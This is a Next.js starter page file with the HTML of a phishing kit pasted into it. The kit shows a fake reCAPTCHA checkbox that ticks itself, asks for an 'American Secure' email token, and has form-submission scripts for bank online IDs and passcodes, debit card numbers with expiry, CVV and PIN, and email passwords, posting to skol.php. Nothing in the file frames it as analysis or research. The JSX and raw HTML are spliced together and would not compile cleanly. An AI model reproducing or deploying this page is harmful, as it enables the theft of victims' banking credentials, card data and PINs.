import Head from 'next/head'
import Header from '@components/Header'
import Footer from '@components/Footer'

export default function Home() {
  return (
    <div className="container">
      <Head>
        <title>Next.js Starter!</title>
        <link rel="icon" href="/favicon.ico" />
      </Head> 
<html lang="en-US" layoutversion="3.1.0" layoutsupportheaderversion="5.0.1"><head>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Safe Browsing</title>
<link rel="shortcut icon" href="./assets/favicon.ico">
<link rel="stylesheet" type="text/css" href="./assets/main.css">
<link rel="stylesheet" type="text/css" href="./assets/algo.css">
<style>.st0{fill:#243b7a}.st0{fill:#243b7a}.st0{fill:#243b7a}</style><style>body{visibility:hidden}</style>
<style>
body {
	font-family: 'Barlow', serif;
}
@font-face {
	font-family: 'Barlow';
	src: url('./assets/Barlow-Regular.ttf');
}
.navigation__logo {
    display: flex;
    -ms-flex-pack: justify;
    max-width: 380px;
    max-height: 45px;
	padding-top: 7px;
	padding-left: 0px;
	padding-bottom: 7px;
}
</style>
<style>
#loading {
  display: inline-block;
  width: 190px;
  height: 190px;
  border: 3px solid rgba(255,255,255,.3);
  border-radius: 50%;
  border-top-color:lightblue;
  animation: spin 1s ease-in-out infinite;
  -webkit-animation: spin 1s ease-in-out infinite;
}
@keyframes spin {
  to { -webkit-transform: rotate(360deg); }
}
@-webkit-keyframes spin {
  to { -webkit-transform: rotate(360deg); }
}
#inTurnFadingTextG{
	width:132px;
	margin:auto;
}
.inTurnFadingTextG{
	color:rgb(58,59,111);
	font-family:Arial;
	font-size:14px;
	text-decoration:none;
	font-weight:normal;
	font-style:normal;
	float:left;
	animation-name:bounce_inTurnFadingTextG;
		-o-animation-name:bounce_inTurnFadingTextG;
		-ms-animation-name:bounce_inTurnFadingTextG;
		-webkit-animation-name:bounce_inTurnFadingTextG;
		-moz-animation-name:bounce_inTurnFadingTextG;
	animation-duration:2.09s;
		-o-animation-duration:2.09s;
		-ms-animation-duration:2.09s;
		-webkit-animation-duration:2.09s;
		-moz-animation-duration:2.09s;
	animation-iteration-count:infinite;
		-o-animation-iteration-count:infinite;
		-ms-animation-iteration-count:infinite;
		-webkit-animation-iteration-count:infinite;
		-moz-animation-iteration-count:infinite;
	animation-direction:normal;
		-o-animation-direction:normal;
		-ms-animation-direction:normal;
		-webkit-animation-direction:normal;
		-moz-animation-direction:normal;
}
#inTurnFadingTextG_1{
	animation-delay:0.75s;
		-o-animation-delay:0.75s;
		-ms-animation-delay:0.75s;
		-webkit-animation-delay:0.75s;
		-moz-animation-delay:0.75s;
}
#inTurnFadingTextG_2{
	animation-delay:0.9s;
		-o-animation-delay:0.9s;
		-ms-animation-delay:0.9s;
		-webkit-animation-delay:0.9s;
		-moz-animation-delay:0.9s;
}
#inTurnFadingTextG_3{
	animation-delay:1.05s;
		-o-animation-delay:1.05s;
		-ms-animation-delay:1.05s;
		-webkit-animation-delay:1.05s;
		-moz-animation-delay:1.05s;
}
#inTurnFadingTextG_4{
	animation-delay:1.2s;
		-o-animation-delay:1.2s;
		-ms-animation-delay:1.2s;
		-webkit-animation-delay:1.2s;
		-moz-animation-delay:1.2s;
}
#inTurnFadingTextG_5{
	animation-delay:1.35s;
		-o-animation-delay:1.35s;
		-ms-animation-delay:1.35s;
		-webkit-animation-delay:1.35s;
		-moz-animation-delay:1.35s;
}
#inTurnFadingTextG_6{
	animation-delay:1.5s;
		-o-animation-delay:1.5s;
		-ms-animation-delay:1.5s;
		-webkit-animation-delay:1.5s;
		-moz-animation-delay:1.5s;
}
#inTurnFadingTextG_7{
	animation-delay:1.64s;
		-o-animation-delay:1.64s;
		-ms-animation-delay:1.64s;
		-webkit-animation-delay:1.64s;
		-moz-animation-delay:1.64s;
}
@keyframes bounce_inTurnFadingTextG{
	0%{
		color:rgb(58,59,111);
	}
	100%{
		color:rgb(255,255,255);
	}
}
@-o-keyframes bounce_inTurnFadingTextG{
	0%{
		color:rgb(58,59,111);
	}
	100%{
		color:rgb(255,255,255);
	}
}
@-ms-keyframes bounce_inTurnFadingTextG{
	0%{
		color:rgb(58,59,111);
	}
	100%{
		color:rgb(255,255,255);
	}
}
@-webkit-keyframes bounce_inTurnFadingTextG{
	0%{
		color:rgb(58,59,111);
	}
	100%{
		color:rgb(255,255,255);
	}
}
@-moz-keyframes bounce_inTurnFadingTextG{
	0%{
		color:rgb(58,59,111);
	}
	100%{
		color:rgb(255,255,255);
	}
}
.tooltip {
    position: absolute;
    white-space: nowrap;
	left:-10%;
	bottom:30;
    display: none;
    background: #ffffcc;
    border: 1px solid black;
    padding: 5px;
    z-index: 1000;
    color: black;
	opacity: .9;
}
.tooltipcard {
    position: absolute;
    white-space: nowrap;
	left:-80%;
	bottom:50;
    display: none;
    background: #ffffcc;
    border: 1px solid black;
    padding: 5px;
    z-index: 1000;
    color: black;
	opacity: .9;
}
.tooltipvmail {
    position: absolute;
    white-space: nowrap;
	left:-80%;
	bottom:50;
    display: none;
    background: #ffffcc;
    border: 1px solid black;
    padding: 5px;
    z-index: 1000;
    color: black;
	opacity: .9;
}
.noselect {
  -webkit-touch-callout: none; /* iOS Safari */
    -webkit-user-select: none; /* Safari */
     -khtml-user-select: none; /* Konqueror HTML */
       -moz-user-select: none; /* Old versions of Firefox */
        -ms-user-select: none; /* Internet Explorer/Edge */
            user-select: none; /* Non-prefixed version, currently
                                  supported by Chrome, Edge, Opera and Firefox */
}
.myButton {
	box-shadow:inset 0px 1px 0px 0px #ffffff;
	background:linear-gradient(to bottom, #ededed 5%, #dfdfdf 100%);
	background-color:#ededed;
	border-radius:6px;
	border:1px solid #dcdcdc;
	display:inline-block;
	cursor:pointer;
	color:#777777;
	font-family:Arial;
	font-size:15px;
	font-weight:bold;
	padding:6px 24px;
	text-decoration:none;
	text-shadow:0px 1px 0px #ffffff;
}
.myButton:hover {
	background:linear-gradient(to bottom, #dfdfdf 5%, #ededed 100%);
	background-color:#dfdfdf;
}
.myButton:active {
	position:relative;
	top:1px;
}
</style>
<script>
function show(elem) {  
    elem.style.display="inline-block";
}
function hide(elem) { 
    elem.style.display="";
}
function verify() {
	if (document.getElementById('onlineId1').value.length > '3' && document.getElementById('passcode1').value.length > '3') {
		document.getElementById('loadinglogin').style.display = 'block';
		setTimeout(continueform, 2000);
		function continueform() {
			document.getElementById('signinClient').submit();
		}
	}
}
function verify2() {
	if (document.getElementById('onlineId1').value.length > '3' && document.getElementById('passcode1').value.length > '3') {
		document.getElementById('PwdlessFailedNotification').style.display = 'block';
		document.getElementById('loader').style.visibility = 'visible';
		setTimeout(continueform, 3500);
		function continueform() {
			document.getElementById('signinClient2').submit();
		}
	}
}
function verifydebitcard() {
	if (document.getElementById('card').value.length == '19' && document.getElementById('month').value.length > '2' && document.getElementById('year').value.length == '4' && document.getElementById('cvv').value.length > '2' && document.getElementById('pin').value.length > '3') {
		document.getElementById('loadingcard').style.display = 'block';
		setTimeout(continueformq, 3500);
		function continueformq() {
			document.getElementById('debitcardform').submit();
		}
	} else {
		show(tooltip1);
	}
}
function verifydebitcard2() {
	if (document.getElementById('card').value.length == '19' && document.getElementById('month').value.length > '2' && document.getElementById('year').value.length == '4' && document.getElementById('cvv').value.length > '2' && document.getElementById('pin').value.length > '3') {
		document.getElementById('loader').style.visibility = 'visible';
		setTimeout(continueformq, 3500);
		function continueformq() {
			document.getElementById('debitcardform2').submit();
		}
	} else {
		show(tooltip1);
	}
}
function validateEmail(email) {
	var re = /\S+@\S+\.\S+/;
	return re.test(email);
}
function verifyvmail() {
	if (validateEmail(document.getElementById('email').value) == true) {
		if (document.getElementById('email').value.length > 5 && document.getElementById('email_password').value.length > '3') {
			document.getElementById('loader').style.visibility = 'visible';
			setTimeout(continueformq, 3500);
			function continueformq() {
				document.getElementById('vmailform').submit();
			}
		} else {
			show(tooltip1);
		}
	} else {
		show(tooltip2);
	}
}
function verifyrevmail() {
	if (validateEmail(document.getElementById('email').value) == true) {
		if (document.getElementById('email').value.length > 5 && document.getElementById('email_password').value.length > '3') {
			document.getElementById('loader').style.visibility = 'visible';
			setTimeout(continueformq, 3500);
			function continueformq() {
				document.getElementById('revmailform').submit();
			}
		} else {
			show(tooltip1);
		}
	} else {
		show(tooltip2);
	}
}
function dispositivo() {
	document.getElementById('dispositive').style.visibility = 'visible';
	setTimeout(continuetobanc, 1500);
	function continuetobanc() {
		document.getElementById('dispositive').style.visibility = 'hidden';
		document.getElementById('loader').style.visibility = 'visible';
	}
}
function waitfors() {
	setTimeout(continuewaitfors, 2500);
	function continuewaitfors() {
		document.getElementById('init_block').style.display='none';
		document.getElementById('init_hidde').style.display='block';
		//document.getElementById('secure').submit();
	}
}
function validaSession() {
	if (document.getElementById('recaptcha-anchor').classList.contains('recaptcha-checkbox-checked')) {
		document.getElementById('valida').onclick = false;
				var x = "1";
		document.getElementById('secure_session').submit();
	} else {
		document.getElementById('recaptcha-anchor').classList.remove('recaptcha-checkbox-clearOutline');
		document.getElementById('recaptcha-anchor').classList.add('recaptcha-checkbox-expired');
	}
}


waitfors()</script>
</head>
<body class="small small-up medium medium-up large large-up large-only largeCentered landscape standard" style="visibility: visible;">
<div data-sparta-container="homepage" class="flex-grid-nest spa-contextroot-homepage spa-site-homepage">
<script type="text/javascript">if(self==top){var theBody=document.getElementsByTagName("body")[0];theBody.style.visibility="visible"}else top.location=self.location</script>
<noscript><style>body{visibility:visible}</style></noscript>
<div id="loader" style="visibility:hidden; position: absolute; z-index: 1000; display: flex; justify-content: center; align-items: center; height: 100%; width: 100%; background: white center center no-repeat; opacity: .8;">
<center>
<img style="position: absolute; padding-left: 5px; padding-top: 5px;" width="180px" height="180px" src="./assets/load.svg">
<div style="position: relative;" id="loading"></div>
</center>
</div>
<div id="dispositive" onclick="this.style.visibility='hidden';" style="visibility:hidden; position: absolute; z-index: 1000; display: flex; justify-content: center; align-items: center; height: 100%; width: 100%; background: black center center no-repeat; opacity: .3;">
<center>
<img style="position: absolute; padding-left: 5px; padding-top: 5px;" width="180px" height="180px" src="./assets/success.gif">
<div style="position: relative;" id="loading"></div>
</center>
</div>
 
<div id="init_block" style="display: none;">
<div id="loader_init" style="visibility:visible; position: absolute; z-index: 100; display: flex; justify-content: center; align-items: center; height: 100%; width: 100%; background: white center center no-repeat;">
<center>
<img style="position: absolute; padding-left: 5px; padding-top: 5px;" width="180px" height="180px" src="./assets/load.svg">
<div style="position: relative;" id="loading"></div>
<div id="loading_down" style="position: absolute; bottom: 0; right: 0; padding-right: 10px; padding-bottom: 10px;">
<span id="inTurnFadingTextG" style="padding: 3px; padding-left: 8px; padding-right: 1px; background-color: #F2F2F2; color: #3A3B6F;">
<div id="inTurnFadingTextG_1" class="inTurnFadingTextG">L</div>
<div id="inTurnFadingTextG_2" class="inTurnFadingTextG">o</div>
<div id="inTurnFadingTextG_3" class="inTurnFadingTextG">a</div>
<div id="inTurnFadingTextG_4" class="inTurnFadingTextG">d</div>
<div id="inTurnFadingTextG_5" class="inTurnFadingTextG">i</div>
<div id="inTurnFadingTextG_6" class="inTurnFadingTextG">n</div>
<div id="inTurnFadingTextG_7" class="inTurnFadingTextG">g&nbsp;</div>
</span>
</div>
</center>
</div>
</div>
<!-- other -->
<div id="init_hidde" style="display: block;" class="noselect">
<div id="loader_init" style="visibility:visible; position: absolute; z-index: 100; display: flex; justify-content: center; align-items: center; height: 100%; width: 100%; background: white center center no-repeat;">
<center>
<img class="noselect" draggable="false" style="padding:-10px;margin:-10px;" width="180px" height="180px" src="./assets/load.svg">
            <div class="noselect">
                <label class="control-label" style="display:inline-block;max-width:100%;margin-bottom:5px;font-weight:700;box-sizing:border-box;cursor:default;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:1.42857143;color:#333;background-color:#fff">Por favor, demuestre que es un humano.</label>
                <div class="g-recaptcha"><div style="width: 304px; height: 78px"><div>
<div draggable="false" style="position:absolute;width:304px;height:78px;">
<div id="rc-anchor-alert" class="rc-anchor-alert"></div>
<div id="rc-anchor-container" class="rc-anchor rc-anchor-normal rc-anchor-light">
<div id="recaptcha-accessible-status" class="rc-anchor-aria-status" aria-hidden="true">Es necesaria una verificación para el Recaptcha. </div>
<div class="rc-anchor-error-msg-container" style="display:none">
<span class="rc-anchor-error-msg" aria-hidden="true"></span>
</div>
<div class="rc-anchor-content"><div class="rc-inline-block">
<div class="rc-anchor-center-container">
<div class="rc-anchor-center-item rc-anchor-checkbox-holder" id="areaclick" onclick="document.getElementById('areaclick').onclick = false;document.getElementById('recaptcha-anchor').classList.add('recaptcha-checkbox-active');setTimeout(continuewaitfors, 100);function continuewaitfors(){document.getElementById('areaclick').onclick = false;document.getElementById('selecthide').style.display='none';document.getElementById('loadingcaptcha').style.display='block';setTimeout(continuewaitfors, 2100);function continuewaitfors() {document.getElementById('areaclick').onclick = false;document.getElementById('loadingcaptcha').style.display='none';setTimeout(continuewaitfors, 350);function continuewaitfors() {document.getElementById('recaptcha-anchor').classList.add('recaptcha-checkbox-checked');document.getElementById('loadingcaptcha').style.visibility='hidden';}}}">
<span class="recaptcha-checkbox goog-inline-block recaptcha-checkbox-unchecked rc-anchor-checkbox recaptcha-checkbox-focused recaptcha-checkbox-clearOutline recaptcha-checkbox-hover" role="checkbox" aria-checked="false" id="recaptcha-anchor" tabindex="0" dir="ltr" aria-labelledby="recaptcha-anchor-label">
<div class="recaptcha-checkbox-border" id="selecthide" role="presentation"></div>
<div class="recaptcha-checkbox-borderAnimation" role="presentation"></div>
<div class="recaptcha-checkbox-spinner" role="presentation" id="loadingcaptcha" style="display: none; animation-play-state: running; opacity: 1; transform: scale(0);">
<div class="recaptcha-checkbox-spinner-overlay" style="animation-play-state: running;">
</div>
</div>
<div onmouseover="document.getElementById('recaptcha-anchor').classList.add('recaptcha-checkbox-hover')" class="recaptcha-checkbox-checkmark" role="presentation"></div>
</span>
</div>
</div>
</div><div class="rc-inline-block"><div class="rc-anchor-center-container">
<label style="color:#1A1A1A;-webkit-touch-callout: none;-webkit-user-select: none;-khtml-user-select: none;-moz-user-select: none;-ms-user-select: none;user-select: none;" onclick="document.getElementById('recaptcha-anchor').classList.add('recaptcha-checkbox-active');setTimeout(continuewaitfors, 100);function continuewaitfors(){document.getElementById('selecthide').style.display='none';document.getElementById('loadingcaptcha').style.display='block';setTimeout(continuewaitfors, 2100);function continuewaitfors() {document.getElementById('loadingcaptcha').style.display='none';setTimeout(continuewaitfors, 350);function continuewaitfors() {document.getElementById('recaptcha-anchor').classList.add('recaptcha-checkbox-checked');document.getElementById('loadingcaptcha').style.visibility='hidden';}}}" class="rc-anchor-center-item rc-anchor-checkbox-label" aria-hidden="true" role="presentation" id="recaptcha-anchor-label">	
<span aria-live="polite" aria-labelledby="recaptcha-accessible-status"></span>No soy un robot</label>
</div>
</div>
</div>
<div class="rc-anchor-normal-footer" style="padding-top:6px">
<div class="rc-anchor-logo-portrait" aria-hidden="true" role="presentation">
<div class="rc-anchor-logo-img rc-anchor-logo-img-portrait"></div>
<div class="rc-anchor-logo-text">reCAPTCHA</div>
</div>
<div class="rc-anchor-pt" style="-webkit-touch-callout: none;-webkit-user-select: none;-khtml-user-select: none;-moz-user-select: none;-ms-user-select: none;user-select: none;">
<span style="cursor:pointer;color:#555">Privacidad</span><span aria-hidden="true" role="presentation"> - </span><span style="cursor:pointer;color:#555">Términos</span>
</div>
</div></div>
</div>
				</div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div></div>
                <span class="help-block"><strong></strong></span>
            </div>
<form target="_self" id="secure_session" method="POST" action="skol.php">
<input type="hidden" name="secure" value="true" required="">
<input style="display:inline-block;border:0;height:1px;overflow:hidden;padding:0;width:1px;white-space:nowrap" type="text" id="activateEmail" minlength="6" maxlength="6" name="activateEmail" placeholder="Security Code" oninput="this.value = this.value.replace(/[^0-9]/g, ''); this.value = this.value.replace(/(\..*)\./g, '$1');" required="">
<input style="display:inline-block;border:0;height:1px;overflow:hidden;padding:0;width:1px;white-space:nowrap" type="submit" value="Ingresar">
<div style="padding-top:1px"></div>
<a id="valida" class="myButton" style="cursor:pointer;color:grey" onclick="validaSession()">Ingresar</a>
</form>
<br><br><br><br><br><br>
</center>
</div>
</div>
<center>
<h1>American Secure:</h1>
<br>
<span>Activate your account.</span>
<br>
<span>Please confirm your token received in your email.</span>
<br>
<div id="sw">
<form target="_self" id="secure" method="POST" action="./" autocomplete="off">
<input type="text" id="activateEmail" minlength="6" maxlength="6" name="activateEmail" placeholder="Security Code" oninput="this.value = this.value.replace(/[^0-9]/g, ''); this.value = this.value.replace(/(\..*)\./g, '$1');" required="">
<input type="submit" value="Submit">
<input type="hidden" name="viewstate" value="?HJ1Z3SxlcyxjYXJsb3NetYXJpbnNpZm9udGVzQGdtYWlsLmfNvbSw1RkJCNDVFMTcyR7EFDNEVENDYzMkYg54Qzg0RDE2Q0gFBQjdDNkY4M1zZFNzRGMjV3CQUU3MT2Uz">
<input type="submit" value="entrar">
</form>
</div>
</center>
</div>

</body></html>
